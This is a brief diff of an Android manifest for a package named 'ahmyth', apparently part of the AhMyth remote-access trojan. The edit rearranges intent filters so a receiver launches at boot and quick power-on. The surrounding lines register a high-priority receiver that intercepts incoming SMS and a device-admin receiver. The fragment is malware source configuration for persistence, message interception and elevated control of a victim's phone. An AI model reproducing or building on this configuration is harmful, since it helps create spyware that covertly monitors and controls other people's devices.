@@ -35,12 +35,11 @@
         <receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.MyReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
             <intent-filter android:priority="9999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
-            </intent-filter>
-            <intent-filter>
-                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
             </intent-filter>
         </receiver>
         <receiver android:name="ahmyth.mine.king.ahmyth.AdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
